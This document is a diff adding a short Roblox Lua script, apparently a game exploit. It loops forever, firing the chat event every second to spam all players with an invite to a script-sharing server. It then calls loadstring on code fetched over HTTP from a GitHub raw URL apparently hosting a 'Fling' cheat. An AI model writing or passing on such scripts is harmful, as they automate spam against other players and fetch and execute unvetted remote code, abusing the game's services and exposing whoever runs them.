@@ -1,0 +1,9 @@
+while true do
+
+   wait(1)
+local A_1 = "Join.gg/gfBTbDnzvg | For Scripts join NOW"-----message here
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/DOAdock/Fling/main/OP'))()
